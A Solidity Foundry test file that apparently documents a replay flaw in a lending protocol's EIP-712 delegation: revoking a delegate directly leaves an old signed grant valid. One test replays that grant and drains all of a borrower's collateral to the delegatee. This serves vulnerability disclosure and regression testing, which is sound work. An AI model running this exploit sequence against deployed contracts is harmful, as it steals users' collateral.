// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {DelegateAbleGtTest} from "./DelegateAbleGt.t.sol";
import {DelegateAble} from "contracts/v2/lib/DelegateAble.sol";
import {LoanUtils} from "./utils/LoanUtils.sol";

/// @notice Focused regression/PoC tests for revocation of outstanding EIP-712 grants.
/// @dev Uses the protocol's real V2 market and gearing-token test deployment inherited
///      from DelegateAbleGtTest; this is not a standalone mock of the vulnerable logic.
contract DelegateRevocationReplayTest is DelegateAbleGtTest {
    function _sign(DelegateAble.DelegateParameters memory params)
        internal
        view
        returns (DelegateAble.Signature memory signature)
    {
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256(
                    "DelegationWithSig(address delegator,address delegatee,bool isDelegate,uint256 nonce,uint256 deadline)"
                ),
                params.delegator,
                params.delegatee,
                params.isDelegate,
                params.nonce,
                params.deadline
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", delegateableGt.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(delegatorPrivateKey, digest);
        signature = DelegateAble.Signature({v: v, r: r, s: s});
    }

    function _grant(uint256 deadline) internal view returns (DelegateAble.DelegateParameters memory params) {
        params = DelegateAble.DelegateParameters({
            delegator: delegator,
            delegatee: delegatee,
            isDelegate: true,
            nonce: delegateableGt.nonces(delegator),
            deadline: deadline
        });
    }

    /// @notice The direct revocation path changes only the boolean and does not
    ///         invalidate a previously signed, still-unconsumed grant.
    function test_DirectRevokeDoesNotInvalidateOutstandingSignedGrant() public {
        DelegateAble.DelegateParameters memory params = _grant(type(uint256).max);
        DelegateAble.Signature memory signature = _sign(params);

        vm.startPrank(delegator);
        delegateableGt.setDelegate(delegatee, true);
        delegateableGt.setDelegate(delegatee, false);
        vm.stopPrank();

        assertFalse(delegateableGt.isDelegate(delegator, delegatee), "direct revoke did not clear delegate");
        assertEq(delegateableGt.nonces(delegator), params.nonce, "direct revoke unexpectedly invalidated grant");

        vm.prank(delegatee);
        delegateableGt.setDelegateWithSignature(params, signature);

        assertTrue(delegateableGt.isDelegate(delegator, delegatee), "stale grant was not replayed");
        assertEq(delegateableGt.nonces(delegator), params.nonce + 1, "signed call did not consume nonce");
    }

    /// @notice End-to-end impact through the actual V2 gearing-token implementation:
    ///         after replaying the stale grant, the delegate repays the small debt and
    ///         sends the entire collateral balance to an arbitrary recipient.
    function test_ReplayedGrantCanTakeAllCollateralThroughRealGt() public {
        uint128 debtAmount = 1;
        uint256 collateralAmount = 2_000e18;

        vm.startPrank(delegator);
        (uint256 gtId,) = LoanUtils.fastMintGt(res, delegator, debtAmount, collateralAmount);
        vm.stopPrank();

        DelegateAble.DelegateParameters memory params = _grant(type(uint256).max);
        DelegateAble.Signature memory signature = _sign(params);

        vm.startPrank(delegator);
        delegateableGt.setDelegate(delegatee, true);
        delegateableGt.setDelegate(delegatee, false);
        vm.stopPrank();

        vm.warp(block.timestamp + 30 days);

        vm.prank(delegatee);
        delegateableGt.setDelegateWithSignature(params, signature);

        uint256 attackerBalanceBefore = res.collateral.balanceOf(delegatee);
        res.debt.mint(delegatee, debtAmount);

        vm.startPrank(delegatee);
        res.debt.approve(address(res.gt), debtAmount);
        res.gt.repayAndRemoveCollateral(
            gtId,
            debtAmount,
            true,
            delegatee,
            abi.encode(collateralAmount)
        );
        vm.stopPrank();

        assertEq(
            res.collateral.balanceOf(delegatee) - attackerBalanceBefore,
            collateralAmount,
            "delegate did not receive all collateral"
        );
        assertEq(res.collateral.balanceOf(address(res.gt)), 0, "collateral remained in GT");
    }

    /// @notice Negative control: consuming the nonce makes the old grant unusable.
    function test_Control_ConsumingNonceInvalidatesOldGrant() public {
        DelegateAble.DelegateParameters memory params = _grant(type(uint256).max);
        DelegateAble.Signature memory signature = _sign(params);

        vm.prank(delegatee);
        delegateableGt.setDelegateWithSignature(params, signature);

        vm.prank(delegator);
        delegateableGt.setDelegate(delegatee, false);

        vm.prank(delegatee);
        vm.expectRevert();
        delegateableGt.setDelegateWithSignature(params, signature);
    }
}
